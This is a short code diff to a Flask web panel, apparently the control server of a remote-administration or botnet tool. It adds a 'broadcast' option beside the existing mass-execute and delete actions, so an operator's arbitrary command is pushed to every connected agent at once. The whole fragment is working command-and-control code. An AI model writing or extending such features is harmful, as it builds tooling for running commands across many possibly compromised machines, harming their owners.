@@ -41,15 +41,25 @@ def geolocation(ip):
 @require_admin
 def mass_execute():
     selection = request.form.getlist('selection')
+    cmd = request.form['cmd']
+
     if 'execute' in request.form:
         for agent_id in selection:
             Agent.query.get(agent_id).push_command(request.form['cmd'])
         flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)))
+
+    elif 'broadcast' in request.form:
+        agent_list = Agent.query.all()
+        for agent in agent_list:
+            Agent.query.get(agent.id).push_command(cmd)
+        flash('Executed "{0}" on {1} agents'.format(cmd, len(agent_list)))
+
     elif 'delete' in request.form:
         for agent_id in selection:
             db.session.delete(Agent.query.get(agent_id))
         db.session.commit()
         flash('Deleted %s agents' % len(selection))
+
     return redirect(url_for('webui.agent_list'))
 
 
